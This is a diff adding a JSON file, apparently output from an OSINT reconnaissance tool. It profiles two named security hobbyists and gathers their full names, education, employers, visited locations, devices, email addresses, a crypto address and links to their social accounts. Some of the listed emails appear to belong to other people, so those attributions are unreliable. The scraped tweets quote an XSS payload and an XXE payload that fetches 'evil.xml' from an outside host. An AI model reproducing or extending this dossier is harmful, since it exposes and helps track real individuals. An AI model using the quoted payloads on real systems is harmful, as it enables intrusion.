@@ -1,0 +1,540 @@
+{
+    "social": {
+        "bhavsec": {
+            "github": {
+                "Profile": {
+                    "login": "bhavsec",
+                    "id": 12765984,
+                    "node_id": "MDQ6VXNlcjEyNzY1OTg0",
+                    "avatar_url": "https://avatars3.githubusercontent.com/u/12765984?v=4",
+                    "gravatar_id": "",
+                    "url": "https://api.github.com/users/bhavsec",
+                    "html_url": "https://github.com/bhavsec",
+                    "followers_url": "https://api.github.com/users/bhavsec/followers",
+                    "following_url": "https://api.github.com/users/bhavsec/following{/other_user}",
+                    "gists_url": "https://api.github.com/users/bhavsec/gists{/gist_id}",
+                    "starred_url": "https://api.github.com/users/bhavsec/starred{/owner}{/repo}",
+                    "subscriptions_url": "https://api.github.com/users/bhavsec/subscriptions",
+                    "organizations_url": "https://api.github.com/users/bhavsec/orgs",
+                    "repos_url": "https://api.github.com/users/bhavsec/repos",
+                    "events_url": "https://api.github.com/users/bhavsec/events{/privacy}",
+                    "received_events_url": "https://api.github.com/users/bhavsec/received_events",
+                    "type": "User",
+                    "site_admin": false,
+                    "name": "BhavKaran",
+                    "company": "SECARMY - Security and Research Company ",
+                    "blog": "https://bhavkaran.com",
+                    "location": "Canada",
+                    "email": null,
+                    "hireable": true,
+                    "bio": "Founder & Leader of SECARMY, Red Team, Developer, Independent Security Researcher, Pentester.",
+                    "twitter_username": "bhavsec",
+                    "public_repos": 3,
+                    "public_gists": 1,
+                    "followers": 77,
+                    "following": 16,
+                    "created_at": "2015-06-05T17:25:11Z",
+                    "updated_at": "2020-07-27T00:57:06Z"
+                },
+                "Repository": [],
+                "Mails": []
+            },
+            "tinder": null,
+            "whatname": [
+                {
+                    "www.chess.com": "https://www.chess.com/member/bhavsec"
+                },
+                {
+                    "en.gravatar.com": "http://en.gravatar.com/profiles/bhavsec.json"
+                },
+                {
+                    "api.github.com": "https://api.github.com/users/bhavsec"
+                },
+                {
+                    "hackerone.com": "https://hackerone.com/bhavsec"
+                },
+                {
+                    "www.facebook.com": "https://www.facebook.com/bhavsec"
+                },
+                {
+                    "www.instagram.com": "https://www.instagram.com/bhavsec/"
+                },
+                {
+                    "www.fiverr.com": "https://www.fiverr.com/bhavsec"
+                },
+                {
+                    "medium.com": "https://medium.com/@bhavsec"
+                },
+                {
+                    "keybase.io": "https://keybase.io/bhavsec"
+                },
+                {
+                    "steamcommunity.com": "https://steamcommunity.com/id/bhavsec"
+                },
+                {
+                    "ifttt.com": "https://ifttt.com/p/bhavsec"
+                },
+                {
+                    "www.xboxgamertag.com": "https://www.xboxgamertag.com/search/bhavsec"
+                },
+                {
+                    "www.pinterest.com": "https://www.pinterest.com/bhavsec/"
+                },
+                {
+                    "open.spotify.com": "https://open.spotify.com/user/bhavsec"
+                },
+                {
+                    "wordpress.org": "https://wordpress.org/support/users/bhavsec/"
+                },
+                {
+                    "psnprofiles.com": "https://psnprofiles.com/bhavsec"
+                },
+                {
+                    "profiles.wordpress.org": "https://profiles.wordpress.org/bhavsec/"
+                },
+                {
+                    "www.tf2items.com": "http://www.tf2items.com/id/bhavsec/"
+                }
+            ],
+            "gravatar": {
+                "entry": [
+                    {
+                        "id": "159688548",
+                        "hash": "c99671faa3870fe82628c6e1f66c9f10",
+                        "requestHash": "bhavsec",
+                        "profileUrl": "http://gravatar.com/bhavsec",
+                        "preferredUsername": "bhavsec",
+                        "thumbnailUrl": "https://secure.gravatar.com/avatar/c99671faa3870fe82628c6e1f66c9f10",
+                        "photos": [
+                            {
+                                "value": "https://secure.gravatar.com/avatar/c99671faa3870fe82628c6e1f66c9f10",
+                                "type": "thumbnail"
+                            }
+                        ],
+                        "name": {
+                            "givenName": "Bhav",
+                            "familyName": "Karan",
+                            "formatted": "Bhav Karan"
+                        },
+                        "displayName": "Bhav Karan",
+                        "urls": []
+                    }
+                ]
+            },
+            "tiktok": null,
+            "medium": null,
+            "pinterest": {
+                "full_name": "BhavKaran",
+                "profile_image": "https://i.pinimg.com/280x280_RS/87/c5/f0/87c5f04c36a30574e0361d2462b6ee91.jpg",
+                "followers": 1,
+                "followings": 9,
+                "bio": "",
+                "country": "CA",
+                "impressum_url": null,
+                "website": null,
+                "board_count": 0,
+                "location": "",
+                "pin_count": 0,
+                "is_verified": false
+            },
+            "keybase": {
+                "Username": "bhavsec",
+                "primary_publickey": "-----BEGIN PGP PUBLIC KEY BLOCK-----\nComment: https://keybase.io/download\nVersion: Keybase Go 5.5.0 (darwin)\n\n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\nEaAQYmHdUaztxFstL3AQx9dzMC92QDwd\n=C1Ca\n-----END PGP PUBLIC KEY BLOCK-----",
+                "account": [
+                    {
+                        "social": "twitter",
+                        "username": "bhavsec",
+                        "url": "https://twitter.com/bhavsec"
+                    },
+                    {
+                        "social": "github",
+                        "username": "bhavsec",
+                        "url": "https://github.com/bhavsec"
+                    },
+                    {
+                        "social": "reddit",
+                        "username": "bhavsec",
+                        "url": "https://reddit.com/user/bhavsec"
+                    },
+                    {
+                        "social": "dns",
+                        "username": "bhavkaran.com",
+                        "url": "http://bhavkaran.com"
+                    }
+                ],
+                "crypto": "3HKuFyrSarFxQ2xtDvFufhjiFRnMyP8fGJ",
+                "picture": "https://s3.amazonaws.com/keybase_processed_uploads/a1e703dfe0327d3af27ed6f323be2405_360_360.jpg",
+                "devices": [
+                    {
+                        "type": "mobile",
+                        "Device_Name": "iPhone X"
+                    },
+                    {
+                        "type": "desktop",
+                        "Device_Name": "MacBook Pro"
+                    }
+                ]
+            },
+            "reddit": null,
+            "fbdata": {
+                "Name": "Bhav Karan",
+                "Work_Education": {
+                    "Professional Skills": [
+                        "Cyber security",
+                        "Ethical Hacking",
+                        "Freelancing",
+                        "Penetration Testing",
+                        "Web designing"
+                    ],
+                    "Education": [
+                        "",
+                        "",
+                        "Chandigarh UniversityClass of 2018 \u00b7 Computer Science Engineering",
+                        "",
+                        "SITA GRAMMAR SCHOOLLeft in 2014 \u00b7 Malerkotla",
+                        "",
+                        "Anand Isher Public Senior Secondary SchoolLeft in 2011 \u00b7 Ahmedgarh"
+                    ]
+                },
+                "Current_city": "Montreal, Quebec since 13 January",
+                "Contact": "http://facebook.com/bhavsec",
+                "ProfilePic": "https://scontent.fcjb1-1.fna.fbcdn.net/v/t1.0-1/p160x160/86694870_10221671768972174_2134184548055908352_n.jpg?_nc_cat=106&_nc_sid=dbb9e7&_nc_oc=AQko__5eK_wzwyUb7p5mfyu2KHP7OqwDvYIF7eczilLmhC39J6q4hO8bu_uTpXLVqmQ&_nc_ht=scontent.fcjb1-1.fna&_nc_tp=6&oh=2c9c391570d0c309a7169f303f55da62&oe=5F33867A"
+            },
+            "instadata": {
+                "Name": "BhavKaran",
+                "URL": "http://youtube.com/bhavsec/",
+                "Bio": "\ud83d\udc7eHacker \ud83d\udea8Red Team \ud83d\udcbb Developer \ud83d\udcb5 Independent Security Researcher \ud83d\udc68\ud83c\udffb\u200d\ud83d\udcbb Pentester \ud83d\udd75\ufe0f\u200d\u2642\ufe0f Founder @sec_army \ud83c\uddee\ud83c\uddf3\ud83c\udde8\ud83c\udde6",
+                "Followers": "33698",
+                "Following": "978",
+                "No_of_posts": 12,
+                "Location": [
+                    "Vieux-Port de Montr\u00e9al",
+                    "Mont-Royal, Quebec",
+                    "Montreal Canada",
+                    "Toronto, Canada",
+                    "Caledon, Ontario",
+                    "Caledon, Ontario",
+                    "Concordia University",
+                    "Mount Royal",
+                    "Concordia University Webster Library - LB",
+                    "Montreal, Quebec",
+                    "Old Port of Montreal"
+                ],
+                "ProfilePic": "https://instagram.fmaa2-1.fna.fbcdn.net/v/t51.2885-19/s320x320/104344746_337060367476616_8891846744168531469_n.jpg?_nc_ht=instagram.fmaa2-1.fna.fbcdn.net&_nc_ohc=bApP5Cd5C7YAX9syr4f&oh=05e649c7efdefcee6f5dd5325cd33383&oe=5F4BA2B3"
+            },
+            "twitterdata": {
+                "ProfilePic": "https://pbs.twimg.com/profile_images/1275092618117025792/R5ZMB6lt_400x400.jpg",
+                "User_Name": "bhavsec",
+                "User_Id": "bhavsec",
+                "Description": "Hacker, Python Developer, Red Teamer, Web Application & Network Pentester, Security Researcher.",
+                "Location": "Canada",
+                "Web_Link": "https://bhavkaran.com",
+                "Twitter_Join_Date": "Joined April 2017",
+                "Birthday": "Birth Date not provided by the user",
+                "Total_Tweets": "223",
+                "Following": "176",
+                "Followers": "Zero",
+                "Tweets": {
+                    "0": "Checkout reNgine-tool for web app recon automation\nreNgine uses configurable scan engines to perform end to end reconnaissance with YAML based configuration allows you to use tools of your choice, wordlist, and many more\n#bugbounty #recon \nGitHub:https://github.com/yogeshojha/rengine\u00a0\u2026",
+                    "1": "Verifying myself: I am bhavsec on http://Keybase.io\u00a0. DnOFzd3d9b-krKtvfiE9D2d6eov-RIIqNvhc / https://keybase.io/bhavsec/sigs/DnOFzd3d9b-krKtvfiE9D2d6eov-RIIqNvhc\u00a0\u2026",
+                    "2": "new macOS CVE-2020-9788 in one tweet :\n\"<img src=1 onerror=document.documentElement.textContent=window.location>.keychain\"pic.twitter.com/jXanwzafk4",
+                    "3": "Writeup on how I made $40,000 breaking the new Chromium Edge using essentially two XSS flaws.https://leucosite.com/Edge-Chromium-EoP-RCE/\u00a0\u2026",
+                    "4": "Bug of the Week! XSS in GMail\u2019s #amp4email implementation via DOM Clobbering by @SecurityMB:https://research.securitum.com/xss-in-amp4email-dom-clobbering/\u00a0\u2026",
+                    "5": "The only legitimate reason to stop hacking is to read this week's A-MA-ZING #BugBytes, with content from @PwnFunction, @secarmyofficial,  and @jespinhara! Have you subscribed already? https://go.intigriti.com/bugbytes-26\u00a0",
+                    "6": "@bugdiscover_ is a partner for SEC-ARMY CTF Event\nwinners of the CTF Event will be announced soon\nStay Tuned!pic.twitter.com/VR3xoW7faH",
+                    "7": "@bugdiscover_ is at Contrivance\nCome meet us & get your swags!\n#contrivance #bugdiscoverpic.twitter.com/U0Hj2uwtx6",
+                    "8": "Security And Research Company (SECARMY) is exhibiting and Organising CTF Hacking Event at Contrivance, Greater Noida, India. \n\nIntroducing our Cyber Security Services and Trainings to secure all type of Organizations.\n\nWe are also giving free cool swag and stickers to everyone.pic.twitter.com/Hb12bKKyZE",
+                    "9": "I love a good XXE writeup, its by far my favourite bugclass. Did you guys catch this one? <3\n\nhttp://opencms.tld/opencms/opencms/handleSolrSelect?fq={!xmlparser%20v=%27<!DOCTYPE+a+[<!ENTITY+\\u0025+asd+SYSTEM+\"http://dom.foo:8080/evil.xml\u00a0\">\\u0025asd%3b\\u0025c%3b]><a>%26rrr%3b</a>%27}https://twitter.com/ShielderSec/status/1117106469328039936\u00a0\u2026"
+                }
+            },
+            "linkedin": {
+                "Profileimg": "https://media-exp1.licdn.com/dms/image/C5103AQHrnyo9wHCtpw/profile-displayphoto-shrink_200_200/0?e=1601510400&v=beta&t=h_UFR1GpmZ7dE5vdMVJP58uHyqE9cU0PWK0p3ch0IMI",
+                "Name": "Bhavkaran Singh Chahal",
+                "Bio": "CEH, Cyber Security Researcher, Developer",
+                "Location": "Montreal, Quebec, Canada",
+                "About": "I am an Independent Security researcher who is passionate about making open-source more accessible, creating\ntechnology to elevate people, and building information security community for cyber security researchers. Some\n\n      technologies I enjoy working with Python, Bash, Javascript....\n            see more\n\n... see more",
+                "Experience": [
+                    {
+                        "Position": "Data Research Analyst",
+                        "Company": "The Logit Group, Inc. Part-time"
+                    },
+                    {
+                        "Position": "Founder & Leader",
+                        "Company": "Security and Research Community (SECARMY)"
+                    },
+                    {
+                        "Position": "Security Consultant",
+                        "Company": "Supive Technology Private Limited"
+                    },
+                    {
+                        "Position": "Team Manager",
+                        "Company": "Intersquad"
+                    }
+                ],
+                "Education": [
+                    {
+                        "University": "Matrix College of Technology and Health Management",
+                        "Degree": "AEC Diploma"
+                    },
+                    {
+                        "University": "CHANDIGARH UNIVERSITY",
+                        "Degree": "Diploma"
+                    }
+                ]
+            },
+            "location": [
+                "Vieux-Port de Montr\u00e9al",
+                "Mont-Royal, Quebec",
+                "Montreal Canada",
+                "Toronto, Canada",
+                "Caledon, Ontario",
+                "Caledon, Ontario",
+                "Concordia University",
+                "Mount Royal",
+                "Concordia University Webster Library - LB",
+                "Montreal, Quebec",
+                "Old Port of Montreal",
+                "Canada"
+            ]
+        },
+        "aravindha1234u": {
+            "github": {
+                "Profile": {
+                    "login": "Aravindha1234u",
+                    "id": 52521300,
+                    "node_id": "MDQ6VXNlcjUyNTIxMzAw",
+                    "avatar_url": "https://avatars0.githubusercontent.com/u/52521300?v=4",
+                    "gravatar_id": "",
+                    "url": "https://api.github.com/users/Aravindha1234u",
+                    "html_url": "https://github.com/Aravindha1234u",
+                    "followers_url": "https://api.github.com/users/Aravindha1234u/followers",
+                    "following_url": "https://api.github.com/users/Aravindha1234u/following{/other_user}",
+                    "gists_url": "https://api.github.com/users/Aravindha1234u/gists{/gist_id}",
+                    "starred_url": "https://api.github.com/users/Aravindha1234u/starred{/owner}{/repo}",
+                    "subscriptions_url": "https://api.github.com/users/Aravindha1234u/subscriptions",
+                    "organizations_url": "https://api.github.com/users/Aravindha1234u/orgs",
+                    "repos_url": "https://api.github.com/users/Aravindha1234u/repos",
+                    "events_url": "https://api.github.com/users/Aravindha1234u/events{/privacy}",
+                    "received_events_url": "https://api.github.com/users/Aravindha1234u/received_events",
+                    "type": "User",
+                    "site_admin": false,
+                    "name": "T3cH_W1z4rD",
+                    "company": "Secarmny Developer",
+                    "blog": "https://aravindha1234u.github.io",
+                    "location": "India",
+                    "email": null,
+                    "hireable": null,
+                    "bio": "\r\n    Cybersecurity Enthusiastic | InfoSec | Pentester | CTF Player | 0-Day Exploits\r\n",
+                    "twitter_username": "aravindha1234u",
+                    "public_repos": 17,
+                    "public_gists": 1,
+                    "followers": 19,
+                    "following": 33,
+                    "created_at": "2019-07-04T05:19:29Z",
+                    "updated_at": "2020-07-22T04:14:41Z"
+                },
+                "Repository": [
+                    "CTF-Writeups",
+                    "CTFd",
+                    "dc9111_0x03",
+                    "githubchallenge",
+                    "graduation"
+                ],
+                "Mails": [
+                    "microdev@gmail.com",
+                    "kchung@nyu.edu",
+                    "0e85dc6eaf@protonmail.com",
+                    "aravindha1234u@gmail.com",
+                    "19695201+BOAKGP@users.noreply.github.com",
+                    "jp@juanpabloflores.me"
+                ]
+            },
+            "tinder": null,
+            "whatname": [
+                {
+                    "aravindha1234u.blogspot.com": "http://aravindha1234u.blogspot.com"
+                },
+                {
+                    "api.github.com": "https://api.github.com/users/aravindha1234u"
+                },
+                {
+                    "en.gravatar.com": "http://en.gravatar.com/profiles/aravindha1234u.json"
+                },
+                {
+                    "www.facebook.com": "https://www.facebook.com/aravindha1234u"
+                },
+                {
+                    "discuss.codecademy.com": "https://discuss.codecademy.com/u/aravindha1234u/summary"
+                },
+                {
+                    "www.pinterest.com": "https://www.pinterest.com/aravindha1234u/"
+                },
+                {
+                    "wordpress.org": "https://wordpress.org/support/users/aravindha1234u/"
+                },
+                {
+                    "profiles.wordpress.org": "https://profiles.wordpress.org/aravindha1234u/"
+                },
+                {
+                    "medium.com": "https://medium.com/@aravindha1234u"
+                },
+                {
+                    "open.spotify.com": "https://open.spotify.com/user/aravindha1234u"
+                },
+                {
+                    "www.instagram.com": "https://www.instagram.com/aravindha1234u/"
+                },
+                {
+                    "www.reddit.com": "https://www.reddit.com/user/aravindha1234u"
+                }
+            ],
+            "gravatar": {
+                "entry": [
+                    {
+                        "id": "83506665",
+                        "hash": "c3414f35d074667fe46618c6d068630f",
+                        "requestHash": "aravindha1234u",
+                        "profileUrl": "http://gravatar.com/aravindha1234u",
+                        "preferredUsername": "aravindha1234u",
+                        "thumbnailUrl": "https://secure.gravatar.com/avatar/c3414f35d074667fe46618c6d068630f",
+                        "photos": [
+                            {
+                                "value": "https://secure.gravatar.com/avatar/c3414f35d074667fe46618c6d068630f",
+                                "type": "thumbnail"
+                            }
+                        ],
+                        "profileBackground": {
+                            "color": "#",
+                            "url": "https://secure.gravatar.com/bg/83506665/e97f1e83e5dc3defd591e34ba5464f23"
+                        },
+                        "name": {
+                            "givenName": "Aravindha Hariharan",
+                            "familyName": "M",
+                            "formatted": "Aravindha Hariharan"
+                        },
+                        "displayName": "Aravindha",
+                        "aboutMe": "Cybersecurity Enthusiastic | InfoSec | Pentester | CTF Player | 0-Day Exploits",
+                        "currentLocation": "Coimbatore",
+                        "emails": [
+                            {
+                                "primary": "true",
+                                "value": "aravindha1234u@gmail.com"
+                            }
+                        ],
+                        "urls": []
+                    }
+                ]
+            },
+            "tiktok": null,
+            "medium": null,
+            "pinterest": {
+                "full_name": "Aravindha Professional",
+                "profile_image": "https://i.pinimg.com/280x280_RS/2f/04/02/2f0402894c7f6c13255e730a00b1f48e.jpg",
+                "followers": 0,
+                "followings": 6,
+                "bio": "",
+                "country": "IN",
+                "impressum_url": null,
+                "website": null,
+                "board_count": 0,
+                "location": "",
+                "pin_count": 0,
+                "is_verified": false
+            },
+            "keybase": null,
+            "reddit": {
+                "username": "aravindha1234u",
+                "posts": [
+                    "Recently got my Nanopi Neo3. Thoughts, interesting benchmark results and comparison to Raspberry Pi 3.",
+                    "Double golden Hogger Reno \u00af\\_(\u30c4)_/\u00af",
+                    "How to at least get 4th with Mukla",
+                    "I beat a 12 winstreak 50+ health divine shield poisonous murlocs Fungalmancer with this beast comp. He had 36 health so it took two turns.",
+                    "I actually got into the final round 15 red whelp",
+                    "Integrating a second Server with OpenVPN",
+                    "Windows 2012 R2 Servers getting SYN-flooded regularily. Any proactive solutions?",
+                    "Jesse complains about erotic fan fiction",
+                    "NSG attached to Application Gateway subnet. How best to allow traffic from Web Apps (Vnet integration)?",
+                    "Application Gateway - really no alternative to using CNAME?",
+                    "Are rat runs possible with 3 players? If so what should be cut?",
+                    "[12-0] Paladin [01-01-16]",
+                    "The Openings of Fallout 3 and New Vegas - In-depth comparison",
+                    "New How to Paladin XXXVII - Draenor Edition!",
+                    "The Kripp: No More Well Met :(",
+                    "How to use Twitter",
+                    "On Faction Imbalance in Random Battleground Populations",
+                    "Class Distribution Data for Patch 5.4.2",
+                    "So.. Anyone else here into Touhou? :) (Wait for it)",
+                    "Current Constructed in a nutshell",
+                    "Timewaste Isle? | Sacred Duty",
+                    "5.4 WeakAuras Strings",
+                    "On Connected Realms",
+                    "Class Distribution Data for Patch 5.4",
+                    "Protection Paladin |Eternal Flame & You? | Theck"
+                ]
+            },
+            "fbdata": {
+                "Name": "Aravindha Hariharan (Techwizard)",
+                "Error": "Profile Not Found"
+            },
+            "instadata": {
+                "Name": "Aravindha Hariharan",
+                "URL": "https://youtu.be/ar70JBIBJT8",
+                "Bio": "\ud83c\udf8212 August\n\ud83d\udd76\ufe0fCreative\n\ud83d\udcdaEx-Kikanian\n\ud83d\udcbc Secarmy Developer @sec_army\n\ud83c\udf93SKCET\n\u2702\ufe0fEditor\n\ud83c\udfa7Music\n\ud83d\udd0aBass lover\n\ud83c\udfaePUBG\n\ud83d\udc80Skullcandy\n\ud83d\udda5\ufe0fT3cH_W1z4rD\n#liveletlive",
+                "Followers": 1788,
+                "Following": 371,
+                "No_of_posts": 341,
+                "Location": [],
+                "ProfilePic": "https://scontent-vie1-1.cdninstagram.com/v/t51.2885-19/s150x150/69431981_460809657837035_7388788520283799552_n.jpg?_nc_ht=scontent-vie1-1.cdninstagram.com&_nc_ohc=cQ6LZaMIs98AX_lH0IL&oh=1d6d7b76e6dff08ff1816796725d648f&oe=5F486864"
+            },
+            "twitterdata": {
+                "ProfilePic": "https://pbs.twimg.com/media/Ed8amQbU8AAGKk7.jpg:thumb\" width=\"78",
+                "User_Name": "Not Found",
+                "Error": "Profile Not Found"
+            },
+            "linkedin": {
+                "Profileimg": "https://media-exp1.licdn.com/dms/image/C5103AQFRkw8I0WGm4A/profile-displayphoto-shrink_200_200/0?e=1601510400&v=beta&t=Tgcl3816YrnYPfkZ0uicnI0flEFTejBfbQnPS2QgAR8",
+                "Name": "Aravindha Hariharan M",
+                "Bio": "Secarmy Developer | CNSS | NSE2 | Cybersecurity Enthusiastic | CTF Player | InfoSec | Red-Hat Academy Student Ambassador",
+                "Location": "Coimbatore, Tamil Nadu, India",
+                "About": "I'm an Cyber Security enthusiast who love to research on the topics related to Capture The Flag, 0 days exploits, \nInformation Security, Ways to create and deploy python tools.\n\n\n...\n            see more\n\n... see more",
+                "Experience": [
+                    {
+                        "Position": "Secarmy Developer",
+                        "Company": "Security and Research Community (SECARMY) Part-time"
+                    },
+                    {
+                        "Position": "CTF Player (Hacker)",
+                        "Company": "Hack The Box"
+                    },
+                    {
+                        "Position": "Level 0x06",
+                        "Company": "TryHackMe"
+                    },
+                    {
+                        "Position": "Student Ambassador - Redhat Academy",
+                        "Company": "Red Hat"
+                    },
+                    {
+                        "Position": "Aravindha vfx",
+                        "Company": "Self employed"
+                    }
+                ],
+                "Education": [
+                    {
+                        "University": "SRI KRISHNA COLLEGE OF ENGINEERING AND TECHNOLOGY",
+                        "Degree": "Bachelor of Technology - BTech"
+                    },
+                    {
+                        "University": "Kikani Vidhya Mandir",
+                        "Degree": "12th"
+                    },
+                    {
+                        "University": "Kikani Vidhya Mandir",
+                        "Degree": "10th"
+                    }
+                ]
+            },
+            "location": []
+        }
+    }
+}
